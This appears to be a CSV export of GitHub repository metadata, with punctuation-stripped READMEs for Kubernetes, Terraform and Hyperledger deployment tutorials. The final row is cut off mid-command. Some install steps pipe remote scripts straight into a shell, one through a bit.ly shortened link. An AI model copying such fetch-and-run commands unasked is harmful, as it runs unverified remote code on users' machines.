unknown,2020-09-25T21:14:09Z,2020-11-06T20:00:45Z,Shell,User,1,1,0,9,master,mmerkes,1,0,0,0,0,0,0
ntd275,k8s-1.19.2-off,,,2020-09-23T10:51:00Z,2020-11-02T02:48:16Z,Shell,User,1,1,0,0,master,,0,0,0,0,0,0,0
ruanbekker,waypoint-python-k8s-demo,,waypoint python k8s demo Hashicorp Waypoint with Python Flask on Kubernetes Demo Docs https www waypointproject io docs https www waypointproject io plugins kubernetes Demo Install a Cluster curl sfL https get k3s io K3SKUBECONFIGMODE 644 sh s cat etc rancher k3s k3s yaml sed s 127 0 0 1 curl s 4 ifconfig co g kubeconfig yml Copy the file to your laptop workstation scp remote k3s kubeconfig yml kube remote k3skubeconfig yml export KUBECONFIG kube remote k3skubeconfig yml Install waypointi client wget https releases hashicorp com waypoint 0 1 4 waypoint0 1 4darwinamd64 zip unzip waypoint0 1 4darwinamd64 zip sudo mv waypoint usr local bin sudo chmod x usr local bin waypoint Test waypoint waypoint Welcome to Waypoint Docs https waypointproject io Version v0 1 4 Test if you can talk to kubernetes kubectl get nodes o wide NAME STATUS ROLES AGE VERSION INTERNAL IP EXTERNAL IP OS IMAGE KERNEL VERSION CONTAINER RUNTIME ams k3s 01 Ready master 44m v1 18 9 k3s1 51 x x x Ubuntu 18 04 5 LTS 4 15 0 118 generic containerd 1 3 3 k3s2 Install waypoint to Kubernetes waypoint install platform kubernetes accept tos Creating Kubernetes resources service waypoint created statefulset apps waypoint server created Kubernetes StatefulSet reporting ready Waiting for Kubernetes service to become ready Configuring server Waypoint server successfully installed and configured The CLI has been configured to connect to the server automatically This connection information is saved in the CLI context named install 1604084620 Use the waypoint context CLI to manage CLI contexts The server has been configured to advertise the following address for entrypoint communications This must be a reachable address for all your deployments If this is incorrect manually set it using the CLI command waypoint server config set Advertise Address 51 x x x 9701 Web UI Address https 51 x x x 9702 Get the project code git clone https github com ruanbekker waypoint python k8s demo cd waypoint python k8s demo Initialize waypoint and build ship and deploy waypoint init waypoint up Initializing Docker client Building image Successfully built 9ad3810bfc78 Successfully tagged waypoint local flask example latest Injecting Waypoint Entrypoint Tagging Docker image waypoint local flask example latest ruanbekker waypoint flask example dca858f31c1e7bc6b31d8f9eb768e67289d15e8cCHANGES1604093131 Pushing Docker image Docker image pushed ruanbekker waypoint flask example dca858f31c1e7bc6b31d8f9eb768e67289d15e8cCHANGES1604093131 Deploying Kubernetes client connected to https 51 x x x 6443 with namespace default Creating deployment Deployment successfully rolled out Releasing Kubernetes client connected to https 51 x x x 6443 with namespace default Creating service Service is ready The deploy was successful A Waypoint deployment URL is shown below This can be used internally to check your deployment and is not meant for external traffic You can manage this hostname using waypoint hostname Release URL http 10 43 34 213 80 Deployment URL https mutually finer leopard v1 waypoint run Test out the endpoint curl https mutually finer leopard v1 waypoint run message hello world Check the deployment kubectl get deployments NAME READY UP TO DATE AVAILABLE AGE flask example 01enxpfc0h42t53hvxbxjygb5p 1 1 1 1 11m View the image tag kubectl get deployment flask example 01enxpfc0h42t53hvxbxjygb5p o jsonpath spec template spec containers 1 image echo ruanbekker waypoint flask example dca858f31c1e7bc6b31d8f9eb768e67289d15e8cCHANGES1604093131 Clean up waypoint destroy Destroying releases Kubernetes client connected to https 51 x x x 6443 with namespace default Deleting service Destroying deployments Kubernetes client connected to https 51 x x x 6443 with namespace default Deleting deployment Destroy successful,2020-10-30T19:48:45Z,2020-11-03T17:19:44Z,HCL,User,1,1,0,7,main,ruanbekker,1,0,0,0,0,0,0
andrioid,gh-action-k8s-set-image,,Kubernetes Set Image A compact way of doing deployments on a Kubernetes cluster Translates a list of deployments containers and images into kubectl commands Groups deployments into one command if possible Waits until all rollout is complete It assumes that your deployments are already set up and does not support creating or editing YAML files There is some error handling and testing but in the end it s purpose is solely to create kubectl run lines NOTICE Use of this action is at your own risk Use the dry run input to see what commands will be run on your cluster before using this in production Requirements kubectl set up and working on your job Inputs namespace required A Kubernetes namespace to run on I recommend adding this to an ENV variable and reference it like env K8SNAMESPACE images required Images to set in the format of deployment This action supports both a single string or a multi line string of images to set See examples for more dry run default false In case you want to see the commands instead of running them This replaces kubectl with echo kubectl in the exec lines Possible values true or false wait default true This adds a command for each deployment to wait for rollout status This is the default behavior as the action isn t really done until the rollout is complete Examples Multi line example Sets the backend and frontend image for a deployment called example workflow yml yaml on push jobs test runs on ubuntu latest name Testing steps name Test our action uses andrioid gh action k8s set image with namespace default images deployment example backend gcr io example backend latest deployment example frontend gcr io example frontend latest Runs kubectl namespace default set image deployment example backend gcr io example backend latest frontend gcr io example frontend latest kubectl namespace default rollout status deployment example Single line example Sets the backend and frontend image for a deployment called example workflow yml yaml on push jobs test runs on ubuntu latest name Testing steps name Test our action uses andrioid gh action k8s set image with namespace default images deployment example backend gcr io example backend latest Runs kubectl namespace default set image deployment example backend gcr io example backend latest kubectl namespace default rollout status deployment example,2020-08-26T13:23:41Z,2020-11-17T20:35:04Z,TypeScript,User,1,1,0,10,master,andrioid,1,1,1,0,1,0,0
3gguan,k8s-gbase8s,,,2020-09-05T07:31:21Z,2020-12-14T15:33:50Z,Shell,User,1,1,0,18,master,3gguan,1,2,3,0,0,0,0
vitthalss,k8s-readiness-liveness-example,,Readiness and Liveness Examples kubectl apply f deploy yml kubectl get pod w kubectl apply f deployfailure yml To apply the erroring liveness url,2020-12-27T16:06:28Z,2020-12-27T16:36:06Z,n/a,User,1,1,0,3,master,MovingToWeb,1,0,0,0,0,0,0
Rotfuks,gcp-k8s-terraform-play,,GCP K8S Terraform Testproject This is a test to automatically create a kubernetes cluster on google cloud platform via terraform Make this test run In order to try it out yourself you first have to setup a project on gcp You can create a free tier or use the free credits you get when creating an account for the first time This project is focused on trying to be as cheap as possible Download the clis First you will need the terraform https www terraform io downloads html cli to run the scripts Checkout the explanations from HashiCorp on how to set it up Also you need the gcloud https cloud google com sdk downloads and kubectl https kubernetes io docs tasks tools install kubectl clis for accessing your cloud environment and the k8s cluster Get your Service Account Key Go to your gcp project or create one and create an service account for this example Generate a key from the service account in json format and save it in the infa folder It is expected to be named gcp service key json Build and push the docker image In order to have something to deploy you can build and push the docker image in the app folder into the gcr It s just a basic application posting a message on localhost 3000 and later in your k8s engine Check out this explanation https cloud google com container registry docs pushing and pulling on how to build and push docker images into the gcr Make your GCR Repo public To make it easier to pull the image you have to make the repository you pushed the app to public Else terraform will not be able to pull the image from your repository You can do this in the Configuration of the GCR on console cloud google com Fill out the variables Last but not least you have to fill out the variables in infra main tf Keep the Defaults but Type in everything that is surrounded with Run this Test Start in the infra directory and run terraform plan To verify if everything is set and working properly usually here terraform will list what it is planning to do Verify all changes Afterwards you can run terraform apply to start creating your environment This can take some times 5minutes After some time you can already see on your cloud console that the k8s cluster is being created When everything is run successful you can verify your cluster the services and your app already Check your app You can find out your freshly created ip address with your orchestrated app container via gcloud auth activate service account key file gcp service key json gcloud container clusters get credentials rotfuks cluster region us central1 project kubectl get services Then access the app with http public ip from the service 3000,2020-09-06T23:35:22Z,2020-09-11T23:53:14Z,HCL,User,2,1,0,1,master,Rotfuks,1,0,0,0,0,0,0
ericogr,k8s-object-template-operator,controller#k8s#kubebuilder#kubernetes#object#operator#operators#template,K8S Object Template Operator CircleCI https circleci com gh ericogr k8s object template operator svg style svg https circleci com gh ericogr k8s object template operator This operator can be used to create any kubernetes object dynamically Build your templates and set parameters to create new k8s objects Use case Many kubernetes clusters are shared among many applications and teams Sometimes services are available within the cluster scope and teams can use it to create or configure services using kubernetes spec such as ConfigMap Secret PrometheusRule ExternalDNS etc Some of these specs are too complex or contains some configurations that we do not want to expose You can automate it s creation using templates This operator can create kubernete objects based on templates and simple namespaced parameters You can give permissions to user create parameters but hide templates and created objects from developers or users using the Kubernetes RBAC system Installation Use the file specs object template operator yaml specs object template operator yaml to start deploy this operator with all permissions dev test mode For production see section about roles bellow sh kubectl apply f https raw githubusercontent com ericogr k8s object template operator master specs object template operator yaml Additionals Kubernetes Roles This operator should be allowed to create objects defined in templates With default permission it can create any object but it can be a bit tricky The ClusterRole k8s ot manager role can be used to set permissions as needed See this example to add ConfigMap permission to this operator yaml apiVersion rbac authorization k8s io v1 kind ClusterRole metadata creationTimestamp null name k8s ot manager role rules HERE ADDED CONFIGMAP PERMISSIONS apiGroups resources configmaps verbs create get list patch update apiGroups template ericogr github com resources objecttemplateparams verbs create delete get list patch update watch apiGroups template ericogr github com resources objecttemplateparams status verbs get patch update apiGroups template ericogr github com resources objecttemplates verbs create delete get list patch update watch apiGroups template ericogr github com resources objecttemplates status verbs get patch update New Custom Resource Definitions CRD s You have two new CRD s ObjectTemplate config crd bases template ericogr github comobjecttemplates yaml and ObjectTemplateParameters config crd bases template ericogr github comobjecttemplateparams yaml ObjectTemplate cluster scope template used to create kubernetes objects at users namespaces can be used by k8s admins ObjectTemplateParameters namespaced parameters used to create objects in their namespace can be used by k8s users devs Templates ObjectTemplate Use templates as a base to create kubernetes objects Users can define your own parameters to create new objects Template example yaml apiVersion template ericogr github com v1 kind ObjectTemplate metadata name objecttemplate configmap test spec description ConfigMap test objects kind ConfigMap apiVersion v1 metadata labels label1 labelvalue1 label2 labelvalue2 annotations annotation1 annotationvalue1 annotation2 annotationvalue2 name configmap test templateBody data name name age age Basic Template Substitution System You can use sintax like variable to replace parameters Let s say you create name foo You can use name inside templateBody template to be replaced in runtime by this controller If you need to scape braces use anything System Runtime Variables Name Description namespace Current namespace apiVersion API Version kind The name of kind name Name of object Parameters ObjectTemplateParams Users can define your own parameters to create new objects based on templates in their namespace Parameters example yaml apiVersion template ericogr github com v1 kind ObjectTemplateParams metadata name objecttemplateparams sample namespace default spec templates name objecttemplate configmap test values name foo age 64,2020-08-18T01:45:05Z,2020-10-21T00:55:11Z,Go,User,1,1,0,54,master,ericogr,1,3,3,0,0,0,0
codersee-blog,kotlin-spring-boot-mysql-k8s,,,2020-10-17T14:27:26Z,2020-10-27T13:36:52Z,Kotlin,User,1,1,0,0,master,,0,0,0,0,0,0,0
clequinio5,ml-microservice-k8s-aws,,CircleCI https circleci com gh clequinio5 ml microservice k8s aws svg style shield https app circleci com pipelines github clequinio5 ml microservice k8s aws Machine Learning API deployment at scale using Docker and Kubernetes Stack Python AWS Cloud9 EC2 Docker Kubernetes CircleCI Overview This project aims to deploy an Machine Learning API at scale using Docker and K8s We are using a pre trained sklearn model that has been trained to predict housing prices in Boston according to several features such as average rooms in a home and data about highway access teacher to pupil ratios and so on Data comes from Kaggle on the data source site https www kaggle com c boston housing This project operationalizes a Python flask appin a provided file app py that serves out predictions inference about housing prices through API calls This project can be extended to any pre trained machine learning model such as those for image recognition and data labeling Deploy Create a virtualenv and activate it Run make install to install the necessary dependencies Running app py 1 Standalone python app py 2 Run in Docker rundocker sh 3 Run in Kubernetes runkubernetes sh Kubernetes Steps Setup and Configure Docker locally Setup and Configure Kubernetes locally Create Flask app in Container Run via kubectl,2020-11-28T23:56:30Z,2020-11-29T17:05:57Z,Python,User,1,1,0,10,main,clequinio5,1,0,0,0,0,0,0
thomasriley,k8s-digital-ocean-env,cloud-native#digitalocean#kubernetes#terraform,k8s digital ocean env Use this project to launch a Cloud Native Kubernetes environment on Digital Ocean with Terraform Prerequisites Firstly create a DigitalOcean account Following this link https m do co c 264f85e9e580 will grant 100 on a new account and also 25 for me thank you Download https www terraform io downloads html and install https learn hashicorp com tutorials terraform install cli the Terraform CLI the latest and greatest version is OK Be ready to use a terminal on your local development environment Clone this repository and switch your terminal to the cloned directory bash git clone https github com thomasriley k8s digital ocean env git cd k8s digital ocean env Navigate to Digital Ocean API token generation page here https cloud digitalocean com account api tokens https cloud digitalocean com account api tokens Create a new Personal access token called terraform and then export it as an environment variable in your terminal bash export DIGITALOCEANTOKEN Then generate a new Spaces access key and set the key ID and key secret in the environment variables as shown below bash export SPACESACCESSKEYID export SPACESSECRETACCESSKEY export AWSACCESSKEYID export AWSSECRETACCESSKEY Make note of these secret tokens so that they can be reused again in future when setting up a terminal for use again You may wish to permanently add these to the terminals session configuration Digital Ocean will only reveal the key secrets once therefore if these keys are lost you will need to regenerate them again Getting Started Firstly ensure the terminals working directory is set to the root of a clone copy of this GitHub project Open the backend tf file in an editor of your choice and comment out the backend configuration block for example terraform Terraform Backend Bucket resource digitaloceanspacesbucket terraformbackend name var prefix var environment var region k8s terraform backend region var region terraform backend s3 endpoint region digitaloceanspaces com key terraform tfstate bucket bucket name region us west 1 skiprequestingaccountid true skipcredentialsvalidation true skipgetec2platforms true skipmetadataapicheck true Then in your terminal initialize Terraform using terraform init bash terraform init Initializing the backend Initializing provider plugins Checking for available provider plugins Downloading plugin for provider digitalocean terraform providers digitalocean 2 3 0 The following providers do not have any version constraints in configuration so the latest version was installed To prevent automatic upgrades to new major versions that may contain breaking changes it is recommended to add version constraints to the corresponding provider blocks in configuration with the constraint strings suggested below provider digitalocean version 2 3 Warning registry terraform io For users on Terraform 0 13 or greater this provider has moved to digitalocean digitalocean Please update your source in requiredproviders Terraform has been successfully initialized You may now begin working with Terraform Try running terraform plan to see any changes that are required for your infrastructure All Terraform commands should now work If you ever set or change modules or backend configuration for Terraform rerun this command to reinitialize your working directory If you forget other commands will detect it and remind you to do so if necessary When initializing Terraform downloads any plugins it needs based on the Terraform projects configured Terraform providers Now generate a Terraform Plan using the terraform plan command bash terraform plan out terraform plan Refreshing Terraform state in memory prior to plan The refreshed state will be used to calculate this plan but will not be persisted to local or remote state storage An execution plan has been generated and is shown below Resource actions are indicated with the following symbols create Terraform will perform the following actions digitaloceankubernetescluster this will be created resource digitaloceankubernetescluster this autoupgrade false clustersubnet known after apply createdat known after apply endpoint known after apply id known after apply ipv4address known after apply kubeconfig sensitive value name do sandbox ams3 k8s cluster region ams3 servicesubnet known after apply status known after apply updatedat known after apply version 1 19 3 do 2 vpcuuid known after apply nodepool actualnodecount known after apply autoscale true id known after apply maxnodes 4 minnodes 2 name worker pool nodes known after apply size s 2vcpu 2gb digitaloceanspacesbucket terraformbackend will be created resource digitaloceanspacesbucket terraformbackend acl private bucketdomainname known after apply forcedestroy false id known after apply name do sandbox ams3 k8s terraform backend region ams3 urn known after apply digitaloceanvpc this will be created resource digitaloceanvpc this createdat known after apply default known after apply id known after apply iprange known after apply name do sandbox ams3 k8s vpc region ams3 urn known after apply Plan 3 to add 0 to change 0 to destroy This plan was saved to terraform plan To perform exactly these actions run the following command to apply terraform apply terraform plan This command generated a visual plan of resources that it would add change or destroy in Digital Ocean if applied The command shown above uses the out flag so a copy of this plan is saved in a binary format that Terraform can then re use Apply the plan that you have just generated using terraform apply bash terraform apply terraform plan digitaloceanvpc this Creating digitaloceanspacesbucket terraformbackend Creating digitaloceanvpc this Creation complete after 1s id 538e523c c579 40b6 a173 055217788ffd digitaloceankubernetescluster this Creating digitaloceanspacesbucket terraformbackend Still creating 10s elapsed digitaloceankubernetescluster this Still creating 10s elapsed digitaloceanspacesbucket terraformbackend Still creating 20s elapsed digitaloceankubernetescluster this Still creating 20s elapsed digitaloceanspacesbucket terraformbackend Still creating 30s elapsed digitaloceankubernetescluster this Still creating 30s elapsed digitaloceanspacesbucket terraformbackend Still creating 40s elapsed digitaloceankubernetescluster this Still creating 40s elapsed digitaloceanspacesbucket terraformbackend Still creating 50s elapsed digitaloceankubernetescluster this Still creating 50s elapsed digitaloceanspacesbucket terraformbackend Creation complete after 59s id do sandbox ams3 k8s terraform backend digitaloceankubernetescluster this Still creating 1m0s elapsed digitaloceankubernetescluster this Still creating 1m10s elapsed digitaloceankubernetescluster this Still creating 1m20s elapsed digitaloceankubernetescluster this Still creating 1m30s elapsed digitaloceankubernetescluster this Still creating 1m40s elapsed digitaloceankubernetescluster this Still creating 1m50s elapsed digitaloceankubernetescluster this Still creating 2m0s elapsed digitaloceankubernetescluster this Still creating 2m10s elapsed digitaloceankubernetescluster this Still creating 2m20s elapsed digitaloceankubernetescluster this Still creating 2m30s elapsed digitaloceankubernetescluster this Still creating 2m40s elapsed digitaloceankubernetescluster this Still creating 2m50s elapsed digitaloceankubernetescluster this Still creating 3m0s elapsed digitaloceankubernetescluster this Still creating 3m10s elapsed digitaloceankubernetescluster this Still creating 3m20s elapsed digitaloceankubernetescluster this Still creating 3m30s elapsed digitaloceankubernetescluster this Still creating 3m40s elapsed digitaloceankubernetescluster this Still creating 3m50s elapsed digitaloceankubernetescluster this Still creating 4m0s elapsed digitaloceankubernetescluster this Still creating 4m10s elapsed digitaloceankubernetescluster this Still creating 4m20s elapsed digitaloceankubernetescluster this Still creating 4m30s elapsed digitaloceankubernetescluster this Still creating 4m40s elapsed digitaloceankubernetescluster this Still creating 4m50s elapsed digitaloceankubernetescluster this Still creating 5m0s elapsed digitaloceankubernetescluster this Still creating 5m10s elapsed digitaloceankubernetescluster this Still creating 5m20s elapsed digitaloceankubernetescluster this Creation complete after 5m22s id ecf8161f 0392 4f2c 82dd 664ea8a1c1be Apply complete Resources 3 added 0 changed 0 destroyed The state of your infrastructure has been saved to the path below This state is required to modify and destroy your infrastructure so keep it safe To inspect the complete state use the terraform show command State path terraform tfstate If you now login to the Digital Ocean portal you will see these resources have been created Back in the terminal you will notice a few files have been created by Terraform when executing the CLI commands bash ls lrtha total 96 drwxr xr x 3 thomas riley staff 96B 12 Dec 12 57 rw r r 1 thomas riley staff 716B 12 Dec 12 57 gitignore rw r r 1 thomas riley staff 1 0K 12 Dec 12 57 LICENSE rw r r 1 thomas riley staff 101B 12 Dec 12 57 README md drwxr xr x 13 thomas riley staff 416B 12 Dec 12 58 git rw r r 1 thomas riley staff 27B 12 Dec 13 12 provider tf rw r r 1 thomas riley staff 193B 12 Dec 13 57 backend tf rw r r 1 thomas riley staff 136B 12 Dec 13 57 networking tf rw r r 1 thomas riley staff 1 8K 12 Dec 14 12 variables tf rw r r 1 thomas riley staff 576B 12 Dec 14 12 kubernetes tf drwxr xr x 3 thomas riley staff 96B 12 Dec 14 13 terraform rw r r 1 thomas riley staff 3 4K 12 Dec 14 14 terraform plan rw r r 1 thomas riley staff 8 1K 12 Dec 14 19 terraform tfstate drwxr xr x 14 thomas riley staff 448B 12 Dec 14 19 The terraform directory contains the Terraform Provider Plugins downloaded by the terraform init command The terraform tfstate file is very important and contains the state of resources that Terraform has just created in Digital Ocean Without the file Terraform will be unable to continue managing the resources it has just created Terraform would attempt to create the new resources again if created a new Terraform plan without this file as it is unaware of the state of the already created resources As manage this Terraform State file locally or from within the Git repo Terraform has a concept of backends https www terraform io docs backends index html for storing state in a remote datastore When running the Terraform Apply on this project a Digital Ocean Space bucket was created for this very purpose Digital Ocean s Spaces product exposes same Swift protocol used by AWS S3 therefore we can use the s3 backend type to store the Terraform state in a Digital Ocean Spaces bucket This is why previously in this README one of the steps was to export the environment variables AWSACCESSKEYID and AWSSECRETACCESSKEY with the Digital Ocean Spaces API keys set Before proceeding firstly open the backends tf file in your editor again and remove the comments that were previously used to disable the backend configuration Now revert back to the terminal and re initialize the Terraform project This time specify the URL of the Spaces API that suits the Digital Ocean Region that is in use see the region Terraform variable in the file variables tf Also specify the name of the Spaces bucket that has been created After executing the terraform init command show below Terraform will note that it can see the state file is on the local filesystem and it will ask if it should be moved to the remote backend Proceed with this by entering yes bash terraform init backend config endpoint ams3 digitaloceanspaces com backend config bucket do sandbox ams3 k8s terraform backend Initializing the backend Do you want to copy existing state to the new backend Pre existing state was found while migrating the previous local backend to the newly configured s3 backend No existing state was found in the newly configured s3 backend Do you want to copy this state to the new s3 backend Enter yes to copy and no to start with an empty state Enter a value yes Successfully configured the backend s3 Terraform will automatically use this backend unless the backend configuration changes Initializing provider plugins The following providers do not have any version constraints in configuration so the latest version was installed To prevent automatic upgrades to new major versions that may contain breaking changes it is recommended to add version constraints to the corresponding provider blocks in configuration with the constraint strings suggested below provider digitalocean version 2 3 Terraform has been successfully initialized You may now begin working with Terraform Try running terraform plan to see any changes that are required for your infrastructure All Terraform commands should now work If you ever set or change modules or backend configuration for Terraform rerun this command to reinitialize your working directory If you forget other commands will detect it and remind you to do so if necessary The state has now been moved to the Digital Ocean Spaces bucket Any terraform files on the local system can now be removed and are no longer required bash rm vfr terraform terraform plan terraform tfstate terraform tfstate backup When interacting with this Terraform project again be sure to export all of the required environment variables and also ensure the required backend config flags are set when using terraform init To validate that Terraform is managing these resources in Digital Ocean generate a new Terraform Plan You will see that Terraform notes there are no changes to be made bash terraform plan Refreshing Terraform state in memory prior to plan The refreshed state will be used to calculate this plan but will not be persisted to local or remote state storage digitaloceanvpc this Refreshing state id c1163b08 237b 4091 98b2 bc1a5de9e20a digitaloceanspacesbucket terraformbackend Refreshing state id do sandbox ams3 k8s terraform backend digitaloceankubernetescluster this Refreshing state id 24ab41b7 4bb4 4edf 821f 76c521df3f30 No changes Infrastructure is up to date This means that Terraform did not detect any differences between your configuration and real physical resources that exist As a result no actions need to be performed,2020-12-12T12:56:46Z,2020-12-13T00:49:08Z,HCL,User,1,1,0,1,main,thomasriley,1,0,0,0,0,0,0
scalasm,aws-k8s-hello-world,,Hello World w Spring Boot and Skaffold This is a sample project for demo purposes providing a simple RESTful API with a simple HTTP POST endpoint It shows how to 1 package a Spring Boot app into a Docker image using Skaffold https skaffold dev and Google Jib https github com GoogleContainerTools jib 2 Deploy it into your Kubernetes cluster Requirements You will need the following in your system Skaffold https skaffold dev 0 15 0 or better Kubectl https kubernetes io docs tasks tools install kubectl 1 17 0 or better a local Kubernetes cluster like Docker for Desktop CE https hub docker com editions community docker ce desktop windows or Minikube https kubernetes io docs setup learning environment minikube if you want to develop with your local cluster Note if you want to work directly with your remote AWS cluster having a local cluster is not strictly needed but strongly advised Suggested IDE s If your are a Visual Studio Code user install Google Cloud Code extension for VS Code https marketplace visualstudio com items itemName GoogleCloudTools cloudcode If you have IntelliJ use Google Cloud Code for IntelliJ https github com GoogleCloudPlatform cloud code intellij Video and tutorials Develop Faster on Kubernetes With Google Container Tools and Cloud Build Cloud Next 19 https www youtube com watch v TYx0BTyFtmc Super charge your GKE Developer Workflow in Visual Studio Code and IntelliJ Cloud Next 19 https www youtube com watch v Z2fyc3AbfKE Quickstart Set your context use if you want to use your local docker daemon registry cache and avoid to deploy to a remote private registry Please take a look at Skaffold docs for more commands and configurations Dev Workflows You can run the following commands by terminal or use the facilities provided by IDE s Code deploy run cycle You code in your IDE while the system listen for changes and build redeploys to your cluster in background skaffold dev Note you can tune the timeouts Code and run You code in your IDEs and deploy run explicitly by typing skaffold run tag dev Note if you don t specify the tag then the latest will be used keep this in mind with your K8S deployments Happy coding Delete your deployment skaffold delete FAQ 1 How do I push images built locally to remote ECR repository You have to do the docker login first and then run Skaffold For example when using AWS CLI v2 as always change account id and region shell script mario Sharkey src medium articles aws k8s hello world aws ecr get login password region eu central 1 docker login username AWS password stdin xxxxxxxxxxxxxxx dkr ecr eu central 1 amazonaws com Login Succeeded shell script mario Sharkey src medium articles aws k8s hello world skaffold run p aws tag dev default repo xxxxxxxxxxxxxxx dkr ecr eu central 1 amazonaws com hello world app Generating tags hello world xxxxxxxxxxxxxxx dkr ecr eu central 1 amazonaws com hello world app hello world dev Checking cache hello world Found Pushing,2020-10-15T18:21:24Z,2020-12-19T17:50:14Z,Java,User,1,1,0,8,master,scalasm,1,0,0,0,2,0,0
happilymarrieddad,k8s-hyperledger-fabric-2.2,,K8s Hyperledger 2 2 Network Important things to read Orderering Service https hyperledger fabric readthedocs io en release 2 2 orderer orderingservice html Peers https hyperledger fabric readthedocs io en release 2 2 peers peers html Getting Started My bash https github com ohmyzsh ohmyzsh Install Hyperledger Deps https hyperledger fabric readthedocs io en release 2 2 install html curl sSL https bit ly 2ysbOFE bash s 2 2 1 1 4 7 Create aws account aws amazon com Create docker hub account https hub docker com Install Kubectl https kubernetes io docs tasks tools install kubectl Install Minikube https minikube sigs k8s io docs start Install Docker compose https docs docker com engine install ubuntu You want to copy over all the bin files into a bin directory where you can easily access them I usually just like to make a bin folder in my home directory and set the path to include that bash mkdir p bin cp fabric samples bin bin kj You then need to add to your bash the path and then source it I use ZSH so this is how I do it Copy this into your bash file bash export PATH PATH bin Then source your bash so they are available Check the execs and make sure they work bash source zshrc This is what you should see bash k8s hyperledger fabric 2 2 master configtxgen version configtxgen Version 2 2 1 Commit SHA 344fda602 Go version go1 14 4 OS Arch linux amd64 k8s hyperledger fabric 2 2 master You then need to install Go and Nodejs I would also suggest installing vue cli but I ve included all the files you need for the front end Golang https golang org dl Nodejs https nodejs org en Docker Local Okay lets generate the certs for the network bash docker compose f network docker docker compose ca yaml up After it s done close down the network Now it s time to generate the network artifacts bash sudo chmod 777 R crypto config sudo chown USER USER R crypto config configtxgen profile OrdererGenesis channelID syschannel outputBlock orderer genesis block configtxgen profile MainChannel outputCreateChannelTx channels mainchannel tx channelID mainchannel configtxgen profile MainChannel outputAnchorPeersUpdate channels ibm anchors tx channelID mainchannel asOrg ibm configtxgen profile MainChannel outputAnchorPeersUpdate channels oracle anchors tx channelID mainchannel asOrg oracle Now it s time to start the network bash docker compose f network docker docker compose yaml up Lets setup the artifacts bash docker exec it cli peer0 ibm bash c peer channel create c mainchannel f channels mainchannel tx o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer1 ibm bash c peer channel create c mainchannel f channels mainchannel tx o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer0 oracle bash c peer channel create c mainchannel f channels mainchannel tx o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer1 oracle bash c peer channel create c mainchannel f channels mainchannel tx o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer0 ibm bash c cp mainchannel block channels docker exec it cli peer0 ibm bash c peer channel join b channels mainchannel block docker exec it cli peer1 ibm bash c peer channel join b channels mainchannel block docker exec it cli peer0 oracle bash c peer channel join b channels mainchannel block docker exec it cli peer1 oracle bash c peer channel join b channels mainchannel block sleep 5 docker exec it cli peer0 ibm bash c peer channel update o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem c mainchannel f channels ibm anchors tx docker exec it cli peer0 oracle bash c peer channel update o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem c mainchannel f channels oracle anchors tx Now we are going to install the chaincode NOTE Make sure you go mod vendor in each chaincode folder might need to remove the go sum depending bash docker exec it cli peer0 ibm bash c peer lifecycle chaincode package resourcetypes tar gz path opt gopath src resourcetypes lang golang label resourcetypes1 docker exec it cli peer1 ibm bash c peer lifecycle chaincode package resourcetypes tar gz path opt gopath src resourcetypes lang golang label resourcetypes1 docker exec it cli peer0 oracle bash c peer lifecycle chaincode package resourcetypes tar gz path opt gopath src resourcetypes lang golang label resourcetypes1 docker exec it cli peer1 oracle bash c peer lifecycle chaincode package resourcetypes tar gz path opt gopath src resourcetypes lang golang label resourcetypes1 docker exec it cli peer0 ibm bash c peer lifecycle chaincode install resourcetypes tar gz pkg txt docker exec it cli peer1 ibm bash c peer lifecycle chaincode install resourcetypes tar gz docker exec it cli peer0 oracle bash c peer lifecycle chaincode install resourcetypes tar gz pkg txt docker exec it cli peer1 oracle bash c peer lifecycle chaincode install resourcetypes tar gz docker exec it cli peer0 ibm bash c peer lifecycle chaincode approveformyorg o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem collections config opt gopath src resourcetypes collections config json channelID mainchannel name resourcetypes version 1 0 sequence 1 package id tail n 1 pkg txt awk NF 1print NF docker exec it cli peer0 oracle bash c peer lifecycle chaincode approveformyorg o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem collections config opt gopath src resourcetypes collections config json channelID mainchannel name resourcetypes version 1 0 sequence 1 package id tail n 1 pkg txt awk NF 1print NF docker exec it cli peer0 ibm bash c peer lifecycle chaincode commit o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem collections config opt gopath src resourcetypes collections config json channelID mainchannel name resourcetypes version 1 0 sequence 1 Lets go ahead and test this chaincode bash docker exec it cli peer0 ibm bash c peer chaincode invoke C mainchannel n resourcetypes c Args Create 1 Parts o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem sleep 5 docker exec it cli peer0 ibm bash c peer chaincode query C mainchannel n resourcetypes c Args Index o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer0 ibm bash c peer chaincode invoke C mainchannel n resourcetypes c Args Update 1 Parts 2 o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer0 ibm bash c peer chaincode invoke C mainchannel n resourcetypes c Args Update 1 Parts o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer0 ibm bash c peer chaincode query C mainchannel n resourcetypes c Args Transactions 1 o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem Lets try the other chaincode bash docker exec it cli peer0 ibm bash c peer lifecycle chaincode package resources tar gz path opt gopath src resources lang golang label resources1 docker exec it cli peer1 ibm bash c peer lifecycle chaincode package resources tar gz path opt gopath src resources lang golang label resources1 docker exec it cli peer0 oracle bash c peer lifecycle chaincode package resources tar gz path opt gopath src resources lang golang label resources1 docker exec it cli peer1 oracle bash c peer lifecycle chaincode package resources tar gz path opt gopath src resources lang golang label resources1 docker exec it cli peer0 ibm bash c peer lifecycle chaincode install resources tar gz pkg txt docker exec it cli peer1 ibm bash c peer lifecycle chaincode install resources tar gz docker exec it cli peer0 oracle bash c peer lifecycle chaincode install resources tar gz pkg txt docker exec it cli peer1 oracle bash c peer lifecycle chaincode install resources tar gz docker exec it cli 